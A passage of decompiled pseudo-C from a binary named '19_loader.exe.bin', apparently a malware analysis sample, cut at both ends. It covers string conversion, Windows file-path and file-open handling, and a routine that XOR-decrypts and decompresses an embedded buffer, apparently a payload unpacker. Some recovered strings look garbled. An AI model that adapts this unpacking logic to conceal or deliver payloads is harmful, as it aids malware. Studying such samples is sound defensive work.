{
  byte bVar1;
  ushort uVar2;
  code *pcVar3;
  undefined8 uVar4;
  ulonglong uVar5;
  ushort *puVar6;
  
  if ((param_3 & 1) != 0) {
                    /* WARNING: Could not recover jumptable at 0x000140010aa5. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    uVar4 = (**(code **)(param_2 + 0x18))(param_1,param_4,param_3 >> 1);
    return uVar4;
  }
  bVar1 = (byte)*param_4;
  if (bVar1 != 0) {
    pcVar3 = *(code **)(param_2 + 0x18);
    uVar5 = 0;
    do {
      puVar6 = (ushort *)((longlong)param_4 + 1);
      if ((char)bVar1 < '\0') {
        if (bVar1 == 0x80) {
          uVar2 = *(ushort *)((longlong)param_4 + 1);
          uVar4 = (*pcVar3)(param_1,(byte *)((longlong)param_4 + 3),(ulonglong)uVar2);
          if ((char)uVar4 != '\0') goto LAB_140010ad6;
          puVar6 = (ushort *)((longlong)param_4 + (ulonglong)uVar2 + 3);
        }
        else {
          if (bVar1 != 0xc0) {
            if ((bVar1 & 1) != 0) {
              puVar6 = (ushort *)((longlong)param_4 + 5);
            }
            if ((bVar1 & 2) != 0) {
              puVar6 = puVar6 + 1;
            }
            if ((bVar1 & 4) != 0) {
              puVar6 = puVar6 + 1;
            }
            if ((bVar1 & 8) != 0) {
              uVar5 = (ulonglong)*puVar6;
              puVar6 = puVar6 + 1;
            }
          }
          uVar4 = (**(code **)(param_3 + uVar5 * 0x10))();
          if ((char)uVar4 != '\0') {
LAB_140010ad6:
            return CONCAT71((int7)((ulonglong)uVar4 >> 8),1);
          }
          uVar5 = uVar5 + 1;
        }
      }
      else {
        uVar4 = (*pcVar3)(param_1,puVar6,(ulonglong)bVar1);
        if ((char)uVar4 != '\0') goto LAB_140010ad6;
        puVar6 = (ushort *)((longlong)puVar6 + (ulonglong)bVar1);
      }
      bVar1 = (byte)*puVar6;
      param_4 = puVar6;
    } while (bVar1 != 0);
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x10bb9 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140010bb9 rva=0x10bb9 */

undefined8 FUN_140010bb9(longlong *param_1,uint param_2)

{
  longlong lVar1;
  longlong lVar2;
  byte bVar3;
  byte bVar4;
  byte bVar5;
  longlong lVar6;
  
  lVar1 = param_1[2];
  bVar5 = (byte)param_2;
  if (param_2 < 0x80) {
    lVar6 = 1;
    FUN_1400125b9(param_1,1);
    *(byte *)(*param_1 + lVar1) = bVar5;
  }
  else if (param_2 < 0x800) {
    lVar6 = 2;
    FUN_1400125b9(param_1,2);
    lVar2 = *param_1;
    *(byte *)(lVar2 + lVar1) = (byte)(param_2 >> 6) | 0xc0;
    *(byte *)(lVar2 + 1 + lVar1) = bVar5 & 0x3f | 0x80;
  }
  else {
    lVar6 = 4;
    FUN_1400125b9(param_1,4 - (ulonglong)(param_2 < 0x10000));
    bVar3 = (byte)(param_2 >> 6) & 0x3f | 0x80;
    bVar4 = bVar5 & 0x3f | 0x80;
    lVar2 = *param_1;
    bVar5 = (byte)(param_2 >> 0xc);
    if (param_2 < 0x10000) {
      *(byte *)(lVar2 + lVar1) = bVar5 | 0xe0;
      *(byte *)(lVar2 + 1 + lVar1) = bVar3;
      *(byte *)(lVar2 + 2 + lVar1) = bVar4;
      lVar6 = 3;
    }
    else {
      *(byte *)(lVar2 + lVar1) = (byte)(param_2 >> 0x12) | 0xf0;
      *(byte *)(lVar2 + 1 + lVar1) = bVar5 & 0x3f | 0x80;
      *(byte *)(lVar2 + 2 + lVar1) = bVar3;
      *(byte *)(lVar2 + 3 + lVar1) = bVar4;
    }
  }
  param_1[2] = lVar6 + lVar1;
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x10cb1 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140010cb1 rva=0x10cb1 */

undefined8 FUN_140010cb1(byte *param_1,longlong param_2,byte *param_3)

{
  byte *pbVar1;
  byte bVar2;
  byte bVar3;
  code *pcVar4;
  bool bVar5;
  short sVar6;
  BOOL BVar7;
  DWORD DVar8;
  longlong lVar9;
  HANDLE hFile;
  uint uVar10;
  undefined8 *puVar11;
  short sVar12;
  WCHAR WVar13;
  uint uVar14;
  DWORD DVar15;
  LPCWSTR pWVar16;
  LPCWSTR pWVar17;
  undefined8 uVar18;
  FILETIME *lpLastAccessTime;
  ulonglong uVar19;
  ulonglong uVar20;
  FILETIME *lpLastWriteTime;
  FILETIME FVar21;
  LPCWSTR pWVar22;
  byte *pbVar23;
  LPCWSTR pWVar24;
  wchar_t *pwVar25;
  FILETIME local_498;
  LPCWSTR local_490;
  LPCWSTR pWStack_488;
  LPCWSTR local_480;
  LPCWSTR local_478;
  LPCWSTR local_470;
  byte *local_468;
  LPCWSTR local_460;
  char local_458 [8];
  LPCWSTR local_450;
  LPCWSTR local_440;
  LPCWSTR local_438;
  LPCWSTR local_430;
  
  FUN_140002164(&local_498,param_2 + 1,0,2,2);
  pbVar23 = param_1 + param_2;
  if ((char)local_498.dwLowDateTime == '\0') {
    local_440 = local_490;
    local_438 = pWStack_488;
    local_430 = (LPCWSTR)0x0;
    uVar10 = 0;
    pWVar24 = local_490;
    do {
      pWVar16 = local_430;
      if ((short)uVar10 != 0) goto LAB_140011394;
      if (pbVar23 == param_1) {
        pWVar17 = local_430;
        pWVar24 = local_440;
        if ((LPCWSTR)0x7 < local_430) goto LAB_140010d69;
        goto LAB_140010dae;
      }
      bVar2 = *param_1;
      uVar10 = (uint)bVar2;
      if ((char)bVar2 < '\0') {
        uVar14 = bVar2 & 0x1f;
        pbVar1 = param_1 + 1;
        if (bVar2 < 0xe0) {
          param_1 = param_1 + 2;
          uVar10 = uVar14 << 6 | *pbVar1 & 0x3f;
          goto LAB_140011394;
        }
        uVar10 = param_1[2] & 0x3f | (*pbVar1 & 0x3f) << 6;
        if (bVar2 < 0xf0) {
          param_1 = param_1 + 3;
          uVar10 = uVar10 | uVar14 << 0xc;
        }
        else {
          pbVar1 = param_1 + 3;
          param_1 = param_1 + 4;
          uVar10 = *pbVar1 & 0x3f | uVar10 << 6 | (bVar2 & 7) << 0x12;
        }
        if (uVar10 < 0x10000) goto LAB_140011394;
        WVar13 = (short)(uVar10 >> 10) + 0x3fc0U | 0xd800;
        uVar10 = uVar10 & 0x3ff | 0xdc00;
      }
      else {
        param_1 = param_1 + 1;
LAB_140011394:
        WVar13 = (WCHAR)uVar10;
        uVar10 = 0;
      }
      if (local_430 == local_438) {
        uVar19 = (longlong)pbVar23 - (longlong)param_1;
        uVar20 = uVar19 + 3;
        if (0xfffffffffffffffc < uVar19) {
          uVar20 = 0xffffffffffffffff;
        }
        lVar9 = FUN_140013790(&local_440,(ulonglong)local_430,
                              ((uVar20 >> 2) + 2) - (ulonglong)((short)uVar10 == 0),(LPVOID)0x2,2);
        if (lVar9 != -1) break;
        pWVar24 = local_440;
      }
      pWVar24[(longlong)pWVar16] = WVar13;
      local_430 = (LPCWSTR)((longlong)pWVar16 + 1);
    } while( true );
  }
  goto LAB_140010fc8;
  while( true ) {
    pWVar17 = pWVar17 + -4;
    pWVar24 = pWVar24 + 8;
    if (pWVar17 < (LPCWSTR)0x8) break;
LAB_140010d69:
    if (((((*pWVar24 == L'\0') || (pWVar24[1] == L'\0')) || (pWVar24[2] == L'\0')) ||
        ((pWVar24[3] == L'\0' || (pWVar24[4] == L'\0')))) ||
       ((pWVar24[5] == L'\0' || ((pWVar24[6] == L'\0' || (pWVar24[7] == L'\0'))))))
    goto LAB_140010dc5;
  }
LAB_140010dae:
  lVar9 = (longlong)pWVar17 * 2;
  while (lVar9 != 0) {
    lVar9 = lVar9 + -2;
    WVar13 = *pWVar24;
    pWVar24 = pWVar24 + 1;
    if (WVar13 == L'\0') {
LAB_140010dc5:
      FUN_140001280(local_440,(longlong)local_438,2,2);
      return 1;
    }
  }
  if (local_430 == local_438) {
    FUN_140011655(&local_440);
  }
  pWVar24 = local_440;
  local_440[(longlong)pWVar16] = L'\0';
  if (local_438 == (LPCWSTR)0xffffffffffffffff) {
    return 1;
  }
  local_470 = (LPCWSTR)((longlong)pWVar16 + 1);
  pWVar16 = local_438;
  local_480 = local_440;
  local_478 = local_438;
  if (local_470 < (LPCWSTR)0x4) {
    if (local_470 != (LPCWSTR)0x0) {
      if (local_470 != (LPCWSTR)0x1) {
        if ((local_470 == (LPCWSTR)0x3) && (local_440[1] == L':')) {
          WVar13 = local_440[2];
          if (WVar13 != L'\0') goto LAB_140010e98;
          if ((*local_440 != L'/') && (*local_440 != L'\\')) goto LAB_140011145;
        }
        goto LAB_140011181;
      }
      if (*local_440 == L'\0') goto LAB_140011145;
    }
LAB_1400111ce:
    local_498.dwLowDateTime = 2;
    local_498.dwHighDateTime = 0;
    local_490 = (LPCWSTR)0x0;
    pWStack_488 = (LPCWSTR)0x0;
    pWVar16 = (LPCWSTR)0x200;
    local_468 = param_3;
    local_460 = local_438;
    do {
      while( true ) {
        if (pWVar16 < (LPCWSTR)0x201) {
          pWVar17 = (LPCWSTR)0x200;
          FVar21 = (FILETIME)&local_440;
          pWVar22 = pWVar16;
        }
        else {
          if (((ulonglong)((longlong)local_490 - (longlong)pWStack_488) <
               (ulonglong)((longlong)pWVar16 - (longlong)pWStack_488)) &&
             (lVar9 = FUN_140013790(&local_498,(ulonglong)pWStack_488,
                                    (longlong)pWVar16 - (longlong)pWStack_488,(LPVOID)0x2,2),
             lVar9 != -1)) goto LAB_140010fc8;
          pWVar17 = local_490;
          if ((LPCWSTR)0xfffffffe < local_490) {
            pWVar17 = (LPCWSTR)0xffffffff;
          }
          FVar21 = local_498;
          pWVar22 = pWVar17;
          pWStack_488 = pWVar17;
        }
        SetLastError(0);
        DVar8 = GetFullPathNameW(pWVar24,(DWORD)pWVar22,(LPWSTR)FVar21,(LPWSTR *)0x0);
        pWVar16 = (LPCWSTR)(ulonglong)DVar8;
        if ((DVar8 == 0) && (DVar15 = GetLastError(), DVar15 != 0)) {
          GetLastError();
          if ((undefined **)PTR_PTR_1400dfa90 != &PTR_LAB_1400886d0) {
            PTR_PTR_1400dfa90 = (undefined *)&PTR_LAB_1400886d0;
          }
          FUN_140001280((LPVOID)local_498,(longlong)local_490,2,2);
          FUN_140001280(local_480,(longlong)local_460,2,2);
          return 1;
        }
        param_3 = local_468;
        if (pWVar22 != pWVar16) break;
        DVar8 = GetLastError();
        if (DVar8 != 0x7a) goto LAB_140010fc8;
        pWVar16 = (LPCWSTR)((longlong)pWVar22 * 2);
        if ((LPCWSTR)0xfffffffe < (LPCWSTR)((longlong)pWVar22 * 2)) {
          pWVar16 = (LPCWSTR)0xffffffff;
        }
      }
    } while (pWVar22 < pWVar16);
    if (pWVar17 < pWVar16) goto LAB_140010fc8;
    local_470 = (LPCWSTR)0x0;
    if (DVar8 < 3) {
      if (DVar8 != 2) goto LAB_1400110b9;
      sVar12 = *(short *)FVar21;
LAB_1400110a1:
      if (sVar12 == 0x5c) {
        sVar6 = *(short *)((longlong)FVar21 + 2);
LAB_1400110ad:
        if (sVar6 == 0x5c) {
LAB_140011047:
          FVar21 = (FILETIME)((longlong)FVar21 + 4);
          pWVar16 = pWVar16 + -1;
          pwVar25 = L"\\\\?\\UNC\\NTDLL.DLL";
          lVar9 = 8;
          goto LAB_1400110bb;
        }
      }
LAB_1400110b9:
      pwVar25 = (wchar_t *)0x2;
      lVar9 = 0;
    }
    else {
      sVar6 = *(short *)((longlong)FVar21 + 2);
      if ((sVar6 != 0x3a) || (*(short *)((longlong)FVar21 + 4) != 0x5c)) {
        sVar12 = *(short *)FVar21;
        if (DVar8 == 3) goto LAB_1400110a1;
        if ((sVar12 == 0x5c) && (sVar6 != 0x3f)) {
          if (sVar6 != 0x5c) goto LAB_1400110ad;
          if (*(short *)((longlong)FVar21 + 4) == 0x2e) {
            if (*(short *)((longlong)FVar21 + 6) == 0x5c) {
              pWVar16 = pWVar16 + -2;
              FVar21 = (FILETIME)((longlong)FVar21 + 8);
              goto LAB_140010fff;
            }
          }
          else if ((*(short *)((longlong)FVar21 + 4) == 0x3f) &&
                  (*(short *)((longlong)FVar21 + 6) == 0x5c)) goto LAB_1400110b9;
          goto LAB_140011047;
        }
        goto LAB_1400110b9;
      }
LAB_140010fff:
      lVar9 = 4;
      pwVar25 = L"\\\\?\\\\\\?\\UNC\\NTDLL.DLL";
    }
LAB_1400110bb:
    pWVar24 = (LPCWSTR)((longlong)pWVar16 + lVar9 + 1);
    if (local_460 < pWVar24) {
      FUN_140022cf8((ulonglong *)local_458,local_480,(longlong)local_460,(ulonglong)pWVar24,
                    (LPVOID)0x2,2);
      if (local_458[0] == '\0') {
        local_480 = local_450;
        local_478 = pWVar24;
      }
      else if (local_450 != (LPCWSTR)0xffffffffffffffff) {
LAB_140010fc8:
                    /* WARNING: Does not return */
        pcVar4 = (code *)invalidInstructionException();
        (*pcVar4)();
      }
    }
    FUN_140002200((longlong *)&local_480,(undefined8 *)pwVar25,(undefined8 *)(pwVar25 + lVar9));
    FUN_140002200((longlong *)&local_480,(undefined8 *)FVar21,
                  (undefined8 *)((longlong)FVar21 + (longlong)pWVar16 * 2));
    pWVar17 = local_470;
    if (local_478 == local_470) {
      FUN_140011655(&local_480);
    }
    pWVar16 = local_478;
    pWVar24 = local_480;
    local_480[(longlong)pWVar17] = L'\0';
    FUN_140001280((LPVOID)local_498,(longlong)local_490,2,2);
    if (pWVar16 == (LPCWSTR)0xffffffffffffffff) {
      return 1;
    }
  }
  else if ((*(longlong *)local_440 != 0x5c003f005c005c) &&
          (*(longlong *)local_440 != 0x5c003f003f005c)) {
    if ((LPCWSTR)0xf7 < local_470) goto LAB_1400111ce;
    if (local_440[1] == L':') {
      WVar13 = local_440[2];
LAB_140010e98:
      if ((WVar13 != L'/') && (WVar13 != L'\\')) goto LAB_140011181;
      WVar13 = *local_440;
      if ((WVar13 != L'/') && (WVar13 != L'\\')) goto LAB_140011145;
    }
    else {
LAB_140011181:
      WVar13 = *local_440;
    }
    if (((WVar13 != L'/') && (WVar13 != L'\\')) ||
       ((local_440[1] != L'/' && (local_440[1] != L'\\')))) goto LAB_1400111ce;
  }
LAB_140011145:
  bVar2 = param_3[0x14];
  uVar10 = (uint)bVar2;
  if (param_3[0x1d] == 0) {
    if (uVar10 != 0) goto LAB_140011423;
    DVar8 = (uint)param_3[0x1c] * 2 + 3;
  }
  else {
    DVar8 = 4;
    if (uVar10 != 0) {
LAB_140011423:
      DVar8 = 1;
    }
  }
  local_440 = (LPCWSTR)CONCAT44(local_440._4_4_,0x18);
  local_438 = (LPCWSTR)0x0;
  local_430 = (LPCWSTR)CONCAT44(local_430._4_4_,(uint)*param_3);
  if (param_3[8] == 0) {
    bVar3 = param_3[2];
    if (param_3[0x24] != 0) {
      if (param_3[0x25] != 0) goto LAB_14001150a;
      DVar15 = (uint)(byte)~bVar3 * -0x80000000 + 0xc0000000;
      goto LAB_14001157c;
    }
    if (param_3[0x25] == 0) {
      if ((param_3[0x1d] == 0 && param_3[0x1c] == 0) && bVar2 == 0) {
        DVar15 = 0x80000000;
        if (bVar3 != 0) goto LAB_14001157c;
        puVar11 = (undefined8 *)&DAT_140089018;
        uVar19 = 0x3a;
      }
      else {
        uVar19 = 0x3d;
        puVar11 = (undefined8 *)&DAT_14008965b;
      }
    }
    else {
LAB_14001150a:
      if (param_3[0x1c] != 1 || bVar2 != 0) {
        DVar15 = (uint)(byte)~bVar3 * -0x80000000 + 0x80120114;
        goto LAB_14001157c;
      }
      puVar11 = (undefined8 *)&DAT_14008a45d;
      uVar19 = 0x2a;
    }
    FUN_14001381b(puVar11,uVar19);
  }
  else {
    DVar15 = *(DWORD *)(param_3 + 0xc);
LAB_14001157c:
    FVar21.dwLowDateTime = 0;
    FVar21.dwHighDateTime = 0;
    if (*param_3 != 0) {
      FVar21 = (FILETIME)&local_440;
    }
    hFile = CreateFileW(pWVar24,DVar15,*(DWORD *)(param_3 + 0x10),(LPSECURITY_ATTRIBUTES)FVar21,
                        DVar8,uVar10 << 0x15 | *(uint *)(param_3 + 0x20) | *(uint *)(param_3 + 0x18)
                              | *(uint *)(param_3 + 4),(HANDLE)0x0);
    if (hFile != (HANDLE)0xffffffffffffffff) {
      if (param_3[0x26] == 0) {
        if (param_3[1] != 0) {
          lpLastAccessTime = (FILETIME *)0x0;
          lpLastWriteTime = &local_498;
          goto LAB_140011230;
        }
LAB_140011243:
        uVar18 = 0;
        if ((DVar8 != 4) || (param_3[0x1c] == 0)) goto LAB_1400114b4;
        DVar8 = GetLastError();
        if (DVar8 == 0xb7) {
          local_498.dwLowDateTime = 0;
          local_498.dwHighDateTime = 0;
          bVar5 = FUN_14000243f(hFile,FileAllocationInfo,&local_498);
          if (bVar5) {
            local_480 = (LPCWSTR)0x0;
            bVar5 = FUN_14000243f(hFile,FileEndOfFileInfo,&local_480);
            if (bVar5) goto LAB_14001153f;
          }
        }
        uVar18 = 0;
      }
      else {
        lpLastAccessTime = &local_498;
        lpLastWriteTime = (FILETIME *)0x0;
        if (param_3[1] != 0) {
          lpLastWriteTime = lpLastAccessTime;
        }
LAB_140011230:
        local_498.dwLowDateTime = 0xffffffff;
        local_498.dwHighDateTime = 0xffffffff;
        BVar7 = SetFileTime(hFile,(FILETIME *)0x0,lpLastAccessTime,lpLastWriteTime);
        if (BVar7 != 0) goto LAB_140011243;
        GetLastError();
LAB_14001153f:
        if ((undefined **)PTR_PTR_1400dfa90 != &PTR_LAB_1400886d0) {
          PTR_PTR_1400dfa90 = (undefined *)&PTR_LAB_1400886d0;
        }
        CloseHandle(hFile);
        uVar18 = 1;
      }
      goto LAB_1400114b4;
    }
    GetLastError();
    if ((undefined **)PTR_PTR_1400dfa90 != &PTR_LAB_1400886d0) {
      PTR_PTR_1400dfa90 = (undefined *)&PTR_LAB_1400886d0;
    }
  }
  uVar18 = 1;
LAB_1400114b4:
  FUN_140001280(pWVar24,(longlong)pWVar16,2,2);
  return uVar18;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x115e2 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400115e2 rva=0x115e2 */

void FUN_1400115e2(undefined8 *param_1,undefined8 *param_2,ulonglong param_3)

{
  code *pcVar1;
  char local_40 [8];
  undefined8 *local_38;
  undefined8 local_30;
  
  FUN_140002164((undefined8 *)local_40,param_3,0,1,1);
  if (local_40[0] != '\0') {
                    /* WARNING: Does not return */
    pcVar1 = (code *)invalidInstructionException();
    (*pcVar1)();
  }
  if (param_3 != 0) {
    FUN_140021f30(local_38,param_2,param_3);
  }
  *param_1 = local_38;
  param_1[1] = local_30;
  param_1[2] = param_3;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x11655 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140011655 rva=0x11655 */

void FUN_140011655(undefined8 *param_1)

{
  code *pcVar1;
  longlong lVar2;
  
  lVar2 = FUN_140013790(param_1,param_1[1],1,(LPVOID)0x2,2);
  if (lVar2 != -1) {
                    /* WARNING: Does not return */
    pcVar1 = (code *)invalidInstructionException();
    (*pcVar1)();
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x11684 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140011684 rva=0x11684 */

void FUN_140011684(undefined8 *param_1)

{
  ulonglong uVar1;
  undefined1 uVar2;
  undefined8 *puVar3;
  ulonglong *puVar4;
  code *pcVar5;
  bool bVar6;
  byte *pbVar7;
  ulonglong uVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  ulonglong uVar12;
  ulonglong uVar13;
  uint uVar14;
  ulonglong uVar15;
  longlong lVar16;
  ulonglong uVar17;
  ulonglong uVar18;
  uint uVar19;
  ulonglong uVar20;
  uint uVar21;
  byte *pbVar22;
  byte bVar23;
  longlong lVar24;
  byte *pbVar25;
  byte *pbVar26;
  ulonglong uVar27;
  ulonglong uVar28;
  bool bVar29;
  uint local_1c4;
  byte *local_1b8;
  ulonglong local_1b0;
  ulonglong local_1a8;
  ulonglong *local_1a0;
  char local_198 [8];
  byte *local_190;
  ulonglong local_188;
  ulonglong local_180;
  ulonglong local_178;
  ulonglong local_170;
  byte local_80 [64];
  
  puVar3 = (undefined8 *)*param_1;
  pbVar26 = (byte *)*puVar3;
  lVar24 = puVar3[1];
  puVar4 = (ulonglong *)puVar3[3];
  *puVar3 = 0;
  if (pbVar26 != (byte *)0x0) {
    uVar20 = *(ulonglong *)puVar3[2];
    local_180 = 0xbae2d64dd63a3919;
    FUN_14001010c(local_80,0xbae2d64dd63a3919);
    lVar16 = 0;
    FUN_1400225e0((undefined1 (*) [32])&local_180,0,0x100);
    do {
      *(char *)((longlong)&local_180 + (ulonglong)local_80[lVar16]) = (char)lVar16;
      lVar16 = lVar16 + 1;
    } while (lVar16 != 0x20);
    FUN_140002164((undefined8 *)local_198,((ulonglong)(lVar24 * 5) >> 3) + 1,0,1,1);
    pbVar22 = pbVar26 + lVar24;
    if (local_198[0] == '\0') {
      local_1b8 = local_190;
      local_1b0 = local_188;
      local_1a8 = 0;
      uVar28 = 0;
      uVar14 = 0;
      lVar24 = 0;
      uVar21 = 0;
      local_1a0 = puVar4;
      do {
        uVar10 = uVar21;
        uVar8 = local_1b0;
        pbVar7 = local_1b8;
        do {
          pbVar25 = pbVar26;
          lVar16 = lVar24;
          if (pbVar25 == pbVar22) {
            if (uVar28 != 0) {
              uVar12 = 0x1640837fe31e6d16;
              if (uVar20 != 0xe27bb381a2ad7424) {
                uVar12 = (uVar20 ^ 0xe27bb381a2ad7424) + 0xb2041bff18f368b;
              }
              uVar20 = 0;
              uVar17 = 0;
              do {
                if ((uVar17 & 7) == 0) {
                  uVar12 = uVar12 + 0xb2041bff18f368b;
                  uVar20 = (uVar12 >> 0x18 ^ uVar12) * -0x39fe3ad90b195fd;
                  uVar20 = (uVar20 >> 0x1a ^ uVar20) * 0x734f7f849f60ca37;
                  uVar20 = uVar20 >> 0x18 ^ uVar20;
                }
                local_1b8[uVar17] =
                     local_1b8[uVar17] ^ (byte)(uVar20 >> (sbyte)((int)(uVar17 & 7) << 3));
                uVar17 = uVar17 + 1;
              } while (uVar28 != uVar17);
              uVar20 = 1;
              if (uVar28 != 0) {
                bVar23 = *local_1b8;
                uVar17 = 0;
                uVar12 = 0;
                uVar14 = 0;
                bVar29 = false;
                uVar21 = 1;
                uVar10 = 1;
                do {
                  uVar14 = uVar14 * 2;
                  if (uVar17 < uVar28) {
                    uVar21 = uVar10 + 1;
                    uVar14 = uVar14 | (local_1b8[uVar17] >> (uVar10 & 7) & 1) != 0;
                    uVar27 = uVar17 + 1;
                    if (uVar21 == 8) {
                      uVar21 = 0;
                      uVar17 = uVar27;
                      uVar12 = uVar27;
                    }
                    uVar10 = uVar21;
                  }
                  bVar6 = !bVar29;
                  bVar29 = true;
                } while (bVar6);
                iVar9 = (uVar14 << 3 ^ 8) + 8;
                if (iVar9 != 0) {
                  uVar27 = 0;
                  uVar17 = uVar12;
                  do {
                    uVar14 = (int)uVar27 * 2;
                    uVar27 = (ulonglong)uVar14;
                    if (uVar12 < uVar28) {
                      uVar27 = (ulonglong)(uVar14 | (local_1b8[uVar12] >> (uVar21 & 7) & 1) != 0);
                      uVar21 = uVar21 + 1;
                      uVar13 = uVar12 + 1;
                      if (uVar21 == 8) {
                        uVar21 = 0;
                        uVar12 = uVar13;
                        uVar17 = uVar13;
                      }
                    }
                    iVar9 = iVar9 + -1;
                  } while (iVar9 != 0);
                  if ((int)uVar27 == 0) {
                    uVar12 = 0;
                    uVar28 = 0;
                    goto LAB_140011a52;
                  }
                  uVar20 = 0x4000000;
                  if (uVar27 < 0x4000000) {
                    uVar20 = uVar27;
                  }
                  FUN_140002164(&local_180,uVar20,0,1,1);
                  uVar20 = local_178;
                  if ((char)local_180 != '\0') goto LAB_1400117e8;
                  local_180 = local_178;
                  local_178 = local_170;
                  local_170 = 0;
                  if ((bVar23 & 1) == 0) {
                    do {
                      uVar12 = local_170;
                      iVar9 = 8;
                      bVar23 = 0;
                      uVar13 = uVar17;
                      do {
                        bVar23 = bVar23 * '\x02';
                        if (uVar17 < uVar28) {
                          bVar23 = bVar23 | (pbVar7[uVar17] >> (uVar21 & 7) & 1) != 0;
                          uVar21 = uVar21 + 1;
                          uVar15 = uVar17 + 1;
                          if (uVar21 == 8) {
                            uVar21 = 0;
                            uVar17 = uVar15;
                            uVar13 = uVar15;
                          }
                        }
                        iVar9 = iVar9 + -1;
                      } while (iVar9 != 0);
                      if (local_170 == local_178) {
                        FUN_1400012c4(&local_180);
                        uVar20 = local_180;
                      }
                      *(byte *)(uVar20 + uVar12) = bVar23;
                      local_170 = uVar12 + 1;
                      uVar17 = uVar13;
                    } while (local_170 != uVar27);
                    uVar12 = uVar27;
                  }
                  else {
                    local_1c4 = 4;
                    if ((int)uVar27 != 1) {
                      lVar24 = 0x3f;
                      if (uVar27 - 1 != 0) {
                        for (; uVar27 - 1 >> lVar24 == 0; lVar24 = lVar24 + -1) {
                        }
                      }
                      uVar10 = (int)lVar24 + 1;
                      uVar14 = 4;
                      if (4 < uVar10) {
                        uVar14 = uVar10;
                      }
                      local_1c4 = 0xe;
                      if (uVar14 < 0xe) {
                        local_1c4 = uVar14;
                      }
                    }
                    uVar12 = 0;
                    do {
                      if (uVar17 < uVar28) {
                        uVar14 = uVar21 & 7;
                        uVar21 = uVar21 + 1;
                        bVar29 = uVar21 == 8;
                        if (bVar29) {
                          uVar21 = 0;
                        }
                        uVar13 = bVar29 + uVar17;
                        if ((pbVar7[uVar17] >> uVar14 & 1) == 0) goto LAB_1400118d7;
                        iVar9 = 8;
                        bVar23 = 0;
                        uVar17 = uVar13;
                        uVar14 = uVar21;
                        do {
                          bVar23 = bVar23 * '\x02';
                          if (uVar13 < uVar28) {
                            uVar21 = uVar14 + 1;
                            bVar29 = uVar21 == 8;
                            if (bVar29) {
                              uVar21 = 0;
                            }
                            pbVar26 = pbVar7 + uVar13;
                            if (bVar29) {
                              uVar17 = uVar13 + 1;
                              uVar13 = uVar13 + 1;
                            }
                            bVar23 = bVar23 | (*pbVar26 >> (uVar14 & 7) & 1) != 0;
                            uVar14 = uVar21;
                          }
                          iVar9 = iVar9 + -1;
                        } while (iVar9 != 0);
                        if (uVar12 == local_178) {
                          FUN_1400012c4(&local_180);
                          uVar20 = local_180;
                        }
                        *(byte *)(uVar20 + uVar12) = bVar23;
                        uVar12 = uVar12 + 1;
                        local_170 = uVar12;
                      }
                      else {
                        uVar13 = uVar17;
LAB_1400118d7:
                        iVar9 = 6;
                        uVar18 = 0;
                        uVar15 = uVar13;
                        uVar14 = uVar21;
                        do {
                          uVar10 = (int)uVar18 * 2;
                          if (uVar13 < uVar28) {
                            pbVar26 = pbVar7 + uVar13;
                            uVar14 = uVar21 + 1;
                            uVar17 = uVar13 + 1;
                            if (uVar14 == 8) {
                              uVar14 = 0;
                              uVar13 = uVar17;
                              uVar15 = uVar17;
                            }
                            uVar10 = uVar10 | (*pbVar26 >> (uVar21 & 7) & 1) != 0;
                            uVar21 = uVar14;
                          }
                          uVar18 = (ulonglong)uVar10;
                          iVar9 = iVar9 + -1;
                        } while (iVar9 != 0);
                        uVar11 = 0;
                        uVar17 = uVar15;
                        uVar21 = uVar14;
                        uVar19 = local_1c4;
                        do {
                          uVar11 = uVar11 * 2;
                          if (uVar15 < uVar28) {
                            uVar21 = uVar14 + 1;
                            uVar11 = uVar11 | (pbVar7[uVar15] >> (uVar14 & 7) & 1) != 0;
                            if (uVar21 == 8) {
                              uVar21 = 0;
                              uVar17 = uVar15 + 1;
                              uVar15 = uVar15 + 1;
                            }
                            uVar14 = uVar21;
                          }
                          uVar19 = uVar19 - 1;
                        } while (uVar19 != 0);
                        uVar18 = uVar18 + 3;
                        uVar13 = uVar17;
                        if (uVar10 == 0x3f) {
                          do {
                            uVar15 = 0;
                            iVar9 = 8;
                            uVar17 = uVar13;
                            do {
                              uVar14 = (int)uVar15 * 2;
                              uVar15 = (ulonglong)uVar14;
                              if (uVar13 < uVar28) {
                                uVar15 = (ulonglong)
                                         (uVar14 | (pbVar7[uVar13] >> (uVar21 & 7) & 1) != 0);
                                uVar21 = uVar21 + 1;
                                uVar1 = uVar13 + 1;
                                if (uVar21 == 8) {
                                  uVar21 = 0;
                                  uVar13 = uVar1;
                                  uVar17 = uVar1;
                                }
                              }
                              iVar9 = iVar9 + -1;
                            } while (iVar9 != 0);
                            uVar18 = uVar18 + uVar15;
                            uVar13 = uVar17;
                          } while (0xfe < (uint)uVar15);
                        }
                        if (uVar12 <= uVar11) break;
                        uVar13 = uVar27 - uVar12;
                        if (uVar18 < uVar27 - uVar12) {
                          uVar13 = uVar18;
                        }
                        if (uVar13 != 0) {
                          uVar15 = ~(ulonglong)uVar11 + uVar12;
                          do {
                            if (uVar12 <= uVar15) goto LAB_1400117e8;
                            uVar2 = *(undefined1 *)(local_180 + uVar15);
                            if (uVar12 == local_178) {
                              FUN_1400012c4(&local_180);
                            }
                            *(undefined1 *)(local_180 + uVar12) = uVar2;
                            uVar12 = uVar12 + 1;
                            uVar15 = uVar15 + 1;
                            uVar13 = uVar13 - 1;
                            uVar20 = local_180;
                            local_170 = uVar12;
                          } while (uVar13 != 0);
                        }
                      }
                    } while (uVar12 < uVar27);
                  }
                  uVar28 = local_178;
                  uVar20 = local_180;
                  goto LAB_140011a52;
                }
              }
            }
            uVar12 = 0;
            uVar20 = 1;
            uVar28 = 0;
LAB_140011a52:
            FUN_140001280(pbVar7,uVar8,1,1);
            *local_1a0 = uVar20;
            local_1a0[1] = uVar28;
            local_1a0[2] = uVar12;
            return;
          }
          pbVar26 = pbVar25 + 1;
          lVar24 = 0;
        } while (lVar16 == 0x2d);
